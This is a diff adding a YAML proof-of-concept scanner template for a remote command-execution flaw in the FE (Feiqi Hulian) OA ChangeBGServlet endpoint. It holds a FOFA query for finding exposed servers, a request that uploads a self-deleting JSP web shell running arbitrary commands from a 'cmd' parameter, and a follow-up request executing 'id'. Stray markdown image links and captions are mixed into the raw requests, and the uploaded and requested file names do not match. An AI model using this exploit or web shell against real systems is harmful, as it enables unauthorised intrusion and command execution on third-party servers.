@@ -1,0 +1,80 @@
+id: poc-hxvs6zxf7s9n2gzg
+info:
+  name: 飞企互联OA ChangeBGServlet存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hxvs6zxf7s9n2gzg'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hxvs6zxf7s9n2gzg
+    fofa: app="FE-协作平台"
+http:
+- raw:
+  - 'POST /mobileKey HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    userName=admin
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261374579-439c16fe-2ba5-4076-bbfe-a8e07e6e5a15.png)
+
+    文件上传'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /servlet/ChangeBGServlet HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+    Cookie: SESSION=ZWRmNDZlNWUtMjJhZC00YTFjLWE5ODYtYTc5NmZjZjY4MWVi
+
+    Connection: close
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykfbdARYXJdNxq686
+
+
+    ------WebKitFormBoundarykfbdARYXJdNxq686
+
+    Content-Disposition: form-data; name="file"; filename="hello.jsp"
+
+    Content-Type: text/plain
+
+
+    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundarykfbdARYXJdNxq686--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261374783-b6477578-5fcb-4d1b-bf68-9673e6acedc1.png)
+
+    携带session执行'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /login/applyTheme/images/portal/login/1759134730704.jsp?cmd=id HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+    Cookie: SESSION=ZWRmNDZlNWUtMjJhZC00YTFjLWE5ODYtYTc5NmZjZjY4MWVi
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760261375076-5af9ed98-ae36-4195-80ac-6f4fd9d03ac4.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
